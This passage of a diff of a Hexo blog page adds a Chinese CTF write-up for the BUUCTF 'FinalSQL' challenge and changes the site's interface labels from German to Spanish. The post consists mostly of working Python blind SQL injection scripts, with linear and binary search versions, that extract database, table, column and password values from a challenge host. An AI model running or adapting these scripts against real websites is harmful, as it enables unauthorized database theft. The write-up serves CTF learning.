url&#x3D;&#39;&#39;&#39;http:&#x2F;&#x2F;e383c445-91e1-4760-ae8f-4b889943e40c.node3.buuoj.cn&#x2F;search.php?id&#x3D;1&#39;&#39;&#39;</span><br><span class="line">            payload&#x3D;&#39;&#39;&#39;?id&#x3D;1&#39;^and substr(database(),%d,1) &#x3D; &#39;%s&#39; &#39;&#39;&#39; %(i,j)</span><br><span class="line">            #print(url+payload+&#39; --+ &#39;)</span><br><span class="line">            r&#x3D;requests.get(url+payload+&#39; --+ &#39;)</span><br><span class="line">            if &#39;NO! Not this! Click others~~~&#39; in r.text:</span><br><span class="line">                databasename +&#x3D; j</span><br><span class="line">                print(databasename)</span><br><span class="line">                break</span><br><span class="line">    print(&quot;database_name:&quot;,databasename.lower())</span><br><span class="line">#database_name()</span><br><span class="line">def table_length():</span><br><span class="line">        for j in range(9999):</span><br><span class="line">            url&#x3D;&#39;&#39;&#39;http:&#x2F;&#x2F;e383c445-91e1-4760-ae8f-4b889943e40c.node3.buuoj.cn&#x2F;search.php?id&#x3D;1&#39;&#39;&#39;</span><br><span class="line">            payload&#x3D;&#39;&#39;&#39;?id&#x3D;1&#39;^and length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1))&gt;%s&#39;&#39;&#39; %j</span><br><span class="line">            r&#x3D;requests.get(url+payload+&#39; --+ &#39;)</span><br><span class="line">            if &#39;NO! Not this! Click others~~~ in r.text:</span><br><span class="line">                print(j)</span><br><span class="line">            else:</span><br><span class="line">                print(&#39;firs table length:&#39;,j)</span><br><span class="line">                break</span><br><span class="line">table_length()</span><br></pre></td></tr></table></figure><br>判断表名和字段名的可以依葫芦画瓢，来写脚本。<br>最终的脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">#然后是二分法，二分法要快很多：</span><br><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"> </span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;5dbbc107-a871-4d45-940a-3b2712330fee.node3.buuoj.cn&#x2F;search.php&quot;</span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">def payload(i,j):</span><br><span class="line">    # sql &#x3D; &quot;1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1&quot;%(i,j)                                #数据库名字          </span><br><span class="line">    # sql &#x3D; &quot;1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)&#x3D;&#39;geek&#39;),%d,1))&gt;%d)^1&quot;%(i,j)           #表名</span><br><span class="line">    # sql &#x3D; &quot;1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;F1naI1y&#39;)),%d,1))&gt;%d)^1&quot;%(i,j)        #列名</span><br><span class="line">    sql &#x3D; &quot;1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1&quot;%(i,j)</span><br><span class="line">    data &#x3D; &#123;&quot;id&quot;:sql&#125;</span><br><span class="line">    r &#x3D; requests.get(url,params&#x3D;data)</span><br><span class="line">    # print (r.url)</span><br><span class="line">    if &quot;Click&quot; in r.text:</span><br><span class="line">        res &#x3D; 1</span><br><span class="line">    else:</span><br><span class="line">        res &#x3D; 0</span><br><span class="line"> </span><br><span class="line">    return res</span><br><span class="line"> </span><br><span class="line">def exp():</span><br><span class="line">    global flag</span><br><span class="line">    for i in range(1,10000) :</span><br><span class="line">        print(i,&#39;:&#39;)</span><br><span class="line">        low &#x3D; 31</span><br><span class="line">        high &#x3D; 127</span><br><span class="line">        while low &lt;&#x3D; high :</span><br><span class="line">            mid &#x3D; (low + high) &#x2F;&#x2F; 2</span><br><span class="line">            res &#x3D; payload(i,mid)</span><br><span class="line">            if res :</span><br><span class="line">                low &#x3D; mid + 1</span><br><span class="line">            else :</span><br><span class="line">                high &#x3D; mid - 1</span><br><span class="line">        f &#x3D; int((low + high + 1)) &#x2F;&#x2F; 2</span><br><span class="line">        if (f &#x3D;&#x3D; 127 or f &#x3D;&#x3D; 31):</span><br><span class="line">            break</span><br><span class="line">        # print (f)</span><br><span class="line">        flag +&#x3D; chr(f)</span><br><span class="line">        print(flag)</span><br><span class="line"> </span><br><span class="line">exp()</span><br><span class="line">print(&#39;flag&#x3D;&#39;,flag)</span><br></pre></td></tr></table></figure><br><img src="/2-16-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-FinalSQL/1.png" class title="Da4er"></p>
+            <p>检测通过测试发现在search.php页面存在sql注入。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1^(ord(substr((select(group_concat(schema_name))from(information_schema.schema ta)),%d,1))&#x3D;%d)^1&quot;%(i,ord(j)) 获取数据库名称 </span><br><span class="line"></span><br><span class="line">1^(ord(substr((select(group_concat(table_name))from(information_schema.tables) where(table_schema)&#x3D;&#39;geek&#39;),%d,1))&#x3D;%d)^1&quot;%(i,ord(j)) 获取数据库表名 </span><br><span class="line"></span><br><span class="line">1^(ord(substr((select(group_concat(column_name))from(information_schema.column s)where(table_name&#x3D;&#39;F1naI1y&#39;)),%d,1))&#x3D;%d)^1&quot;%(i,ord(j)) 获取数据库列名</span><br></pre></td></tr></table></figure>
+<p>先写个判断数据库名的脚本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import requests</span><br><span class="line">def database_len():</span><br><span class="line">    for i in range(9999):</span><br><span class="line">        url&#x3D;&#39;&#39;&#39;http:&#x2F;&#x2F;e383c445-91e1-4760-ae8f-4b889943e40c.node3.buuoj.cn&#x2F;search.php?id&#x3D;1&#39;&#39;&#39;</span><br><span class="line">        payload&#x3D;&#39;&#39;&#39;?id&#x3D;1&#39;^and length(database())&gt;%s&#39;&#39;&#39; %i</span><br><span class="line">        #print(url+payload+&#39; --+ &#39;)</span><br><span class="line">        r&#x3D;requests.get(url+payload+&#39; --+ &#39;)</span><br><span class="line">        if &#39;NO! Not this! Click others~~~&#39; in r.text:</span><br><span class="line">            print(i)</span><br><span class="line">        else:</span><br><span class="line">            print(&#39;database_length:&#39;,i)</span><br><span class="line">            break</span><br><span class="line">#database_len()</span><br><span class="line">def database_name():</span><br><span class="line">    databasename&#x3D;&#39;&#39;</span><br><span class="line">    for i in range(1,9):</span><br><span class="line">        for j in &#39;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#39;:</span><br><span class="line">            url&#x3D;&#39;&#39;&#39;http:&#x2F;&#x2F;e383c445-91e1-4760-ae8f-4b889943e40c.node3.buuoj.cn&#x2F;search.php?id&#x3D;1&#39;&#39;&#39;</span><br><span class="line">            payload&#x3D;&#39;&#39;&#39;?id&#x3D;1&#39;^and substr(database(),%d,1) &#x3D; &#39;%s&#39; &#39;&#39;&#39; %(i,j)</span><br><span class="line">            #print(url+payload+&#39; --+ &#39;)</span><br><span class="line">            r&#x3D;requests.get(url+payload+&#39; --+ &#39;)</span><br><span class="line">            if &#39;NO! Not this! Click others~~~&#39; in r.text:</span><br><span class="line">                databasename +&#x3D; j</span><br><span class="line">                print(databasename)</span><br><span class="line">                break</span><br><span class="line">    print(&quot;database_name:&quot;,databasename.lower())</span><br><span class="line">#database_name()</span><br><span class="line">def table_length():</span><br><span class="line">        for j in range(9999):</span><br><span class="line">            url&#x3D;&#39;&#39;&#39;http:&#x2F;&#x2F;e383c445-91e1-4760-ae8f-4b889943e40c.node3.buuoj.cn&#x2F;search.php?id&#x3D;1&#39;&#39;&#39;</span><br><span class="line">            payload&#x3D;&#39;&#39;&#39;?id&#x3D;1&#39;^and length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1))&gt;%s&#39;&#39;&#39; %j</span><br><span class="line">            r&#x3D;requests.get(url+payload+&#39; --+ &#39;)</span><br><span class="line">            if &#39;NO! Not this! Click others~~~ in r.text:</span><br><span class="line">                print(j)</span><br><span class="line">            else:</span><br><span class="line">                print(&#39;firs table length:&#39;,j)</span><br><span class="line">                break</span><br><span class="line">table_length()</span><br></pre></td></tr></table></figure>
+<p>判断表名和字段名的可以依葫芦画瓢，来写脚本。<br>最终的脚本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">#然后是二分法，二分法要快很多：</span><br><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"> </span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;5dbbc107-a871-4d45-940a-3b2712330fee.node3.buuoj.cn&#x2F;search.php&quot;</span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">def payload(i,j):</span><br><span class="line">    # sql &#x3D; &quot;1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1&quot;%(i,j)                                #数据库名字          </span><br><span class="line">    # sql &#x3D; &quot;1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)&#x3D;&#39;geek&#39;),%d,1))&gt;%d)^1&quot;%(i,j)           #表名</span><br><span class="line">    # sql &#x3D; &quot;1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;F1naI1y&#39;)),%d,1))&gt;%d)^1&quot;%(i,j)        #列名</span><br><span class="line">    sql &#x3D; &quot;1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1&quot;%(i,j)</span><br><span class="line">    data &#x3D; &#123;&quot;id&quot;:sql&#125;</span><br><span class="line">    r &#x3D; requests.get(url,params&#x3D;data)</span><br><span class="line">    # print (r.url)</span><br><span class="line">    if &quot;Click&quot; in r.text:</span><br><span class="line">        res &#x3D; 1</span><br><span class="line">    else:</span><br><span class="line">        res &#x3D; 0</span><br><span class="line"> </span><br><span class="line">    return res</span><br><span class="line"> </span><br><span class="line">def exp():</span><br><span class="line">    global flag</span><br><span class="line">    for i in range(1,10000) :</span><br><span class="line">        print(i,&#39;:&#39;)</span><br><span class="line">        low &#x3D; 31</span><br><span class="line">        high &#x3D; 127</span><br><span class="line">        while low &lt;&#x3D; high :</span><br><span class="line">            mid &#x3D; (low + high) &#x2F;&#x2F; 2</span><br><span class="line">            res &#x3D; payload(i,mid)</span><br><span class="line">            if res :</span><br><span class="line">                low &#x3D; mid + 1</span><br><span class="line">            else :</span><br><span class="line">                high &#x3D; mid - 1</span><br><span class="line">        f &#x3D; int((low + high + 1)) &#x2F;&#x2F; 2</span><br><span class="line">        if (f &#x3D;&#x3D; 127 or f &#x3D;&#x3D; 31):</span><br><span class="line">            break</span><br><span class="line">        # print (f)</span><br><span class="line">        flag +&#x3D; chr(f)</span><br><span class="line">        print(flag)</span><br><span class="line"> </span><br><span class="line">exp()</span><br><span class="line">print(&#39;flag&#x3D;&#39;,flag)</span><br></pre></td></tr></table></figure>
+<img src="/2-16-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-FinalSQL/1.png" class title="Da4er">
+
 
         </div>
         
@@ -642,10 +709,10 @@
 <div class="card card-transparent">
     <nav class="pagination is-centered" role="navigation" aria-label="pagination">
         <div class="pagination-previous is-invisible is-hidden-mobile">
-            <a class="is-flex-grow has-text-black-ter" href="/page/0/">Zurück</a>
+            <a class="is-flex-grow has-text-black-ter" href="/page/0/">Anterior</a>
         </div>
         <div class="pagination-next">
-            <a class="is-flex-grow has-text-black-ter" href="/page/2/">Weiter</a>
+            <a class="is-flex-grow has-text-black-ter" href="/page/2/">Siguiente</a>
         </div>
         <ul class="pagination-list is-hidden-mobile">
             
@@ -674,7 +741,7 @@
     <div class="card-content">
         <div class="menu">
         <h3 class="menu-label">
-            Links
+            Enlaces
         </h3>
         <ul class="menu-list">
         
@@ -722,7 +789,7 @@
     <div class="card-content">
         <div class="menu">
             <h3 class="menu-label">
-                Kategorien
+                Categorías
             </h3>
             <ul class="menu-list">
             <li>
@@ -790,7 +857,7 @@
         <div class="card widget">
     <div class="card-content">
         <h3 class="menu-label">
-            Tag Cloud
+            Nube de etiquetas
         </h3>
         <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Python/" style="font-size: 10px;">Python</a> <a href="/tags/Web%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 17.5px;">Web安全&渗透测试</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 12.5px;">代码审计</a> <a href="/tags/%E7%88%AC%E8%99%AB/" style="font-size: 15px;">爬虫</a>
     </div>
@@ -832,7 +899,7 @@
             <div class="level-item has-text-centered is-marginless">
                 <div>
                     <p class="heading">
-                        Posts
+                        Entradas
                     </p>
                     <a href="/archives">
                         <p class="title has-text-weight-normal">
@@ -844,7 +911,7 @@
             <div class="level-item has-text-centered is-marginless">
                 <div>
                     <p class="heading">
-                        Kategorien
+                        Categorías
                     </p>
                     <a href="/categories">
                         <p class="title has-text-weight-normal">
@@ -856,7 +923,7 @@
             <div class="level-item has-text-centered is-marginless">
                 <div>
                     <p class="heading">
-                        Tags
+                        Etiquetas
                     </p>
                     <a href="/tags">
                         <p class="title has-text-weight-normal">
@@ -869,7 +936,7 @@
         
         <div class="level">
             <a class="level-item button is-link is-rounded" href="https://github.com/Da4er" target="_blank" rel="noopener">
-                Folgen</a>
+                SEGUIR</a>
         </div>
         
         
@@ -898,7 +965,7 @@
             <div class="card widget">
     <div class="card-content">
         <h3 class="menu-label">
-            Letzte Einträge
+            Recientes
         </h3>
         
         <article class="media">
@@ -1003,7 +1070,7 @@
     <div class="card-content">
         <div class="menu">
         <h3 class="menu-label">
-            Archive
+            Archivos
         </h3>
         <ul class="menu-list">
         
@@ -1049,7 +1116,7 @@
     <div class="card-content">
         <div class="menu">
             <h3 class="menu-label">
-                Tags
+                Etiquetas
             </h3>
             <div class="field is-grouped is-grouped-multiline">
                 
@@ -1137,7 +1204,7 @@
             <div class="level-item has-text-centered is-marginless">
                 <div>
                     <p class="heading">
-                        Posts
+                        Entradas
                     </p>
                     <a href="/archives">
                         <p class="title has-text-weight-normal">
@@ -1149,7 +1216,7 @@
             <div class="level-item has-text-centered is-marginless">
                 <div>
                     <p class="heading">
-                        Kategorien
+                        Categorías
                     </p>
                     <a href="/categories">
                         <p class="title has-text-weight-normal">
@@ -1161,7 +1228,7 @@
             <div class="level-item has-text-centered is-marginless">
                 <div>
                     <p class="heading">
-                        Tags
+                        Etiquetas
                     </p>
                     <a href="/tags">
                         <p class="title has-text-weight-normal">
@@ -1174,7 +1241,7 @@
         
         <div class="level">
             <a class="level-item button is-link is-rounded" href="https://github.com/Da4er" target="_blank" rel="noopener">
-                Folgen</a>
+                SEGUIR</a>
         </div>
         
         
@@ -1203,7 +1270,7 @@
         <div class="card widget">
     <div class="card-content">
         <h3 class="menu-label">
-            Letzte Einträge
+            Recientes
         </h3>
         
         <article class="media">
@@ -1308,7 +1375,7 @@
     <div class="card-content">
         <div class="menu">
         <h3 class="menu-label">
-            Archive
+            Archivos
         </h3>
         <ul class="menu-list">
         
@@ -1354,7 +1421,7 @@
     <div class="card-content">
         <div class="menu">
             <h3 class="menu-label">
-                Tags
+                Etiquetas
             </h3>
             <div class="field is-grouped is-grouped-multiline">
                 
@@ -1535,7 +1602,7 @@ document.addEventListener('DOMContentLoaded', function () {
 </script>
 
 
-<a id="back-to-top" title="Zurück nach oben" href="javascript:;">
+<a id="back-to-top" title="Back to Top" href="javascript:;">
     <i class="fas fa-chevron-up"></i>
 </a>
 <script src="/js/back-to-top.js" defer></script>
@@ -1559,7 +1626,7 @@ document.addEventListener('DOMContentLoaded', function () {
     <div class="searchbox ins-search">
     <div class="searchbox-container ins-search-container">
         <div class="searchbox-input-wrapper">
-            <input type="text" class="searchbox-input ins-search-input" placeholder="Tippen Sie etwas..." />
+            <input type="text" class="searchbox-input ins-search-input" placeholder="Teclea algo..." />
             <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
         </div>
         <div class="searchbox-result-wrapper ins-section-wrapper">
@@ -1571,11 +1638,11 @@ document.addEventListener('DOMContentLoaded', function () {
     (function (window) {
         var INSIGHT_CONFIG = {
             TRANSLATION: {
-                POSTS: 'Posts',
-                PAGES: 'Seiten',
-                CATEGORIES: 'Kategorien',
-                TAGS: 'Tags',
-                UNTITLED: '(Unbenannt)',
+                POSTS: 'Entradas',
+                PAGES: 'Páginas',
+                CATEGORIES: 'Categorías',
+                TAGS: 'Etiquetas',
+                UNTITLED: '(Sin título)',
             },
             CONTENT_URL: '/content.json',
         };
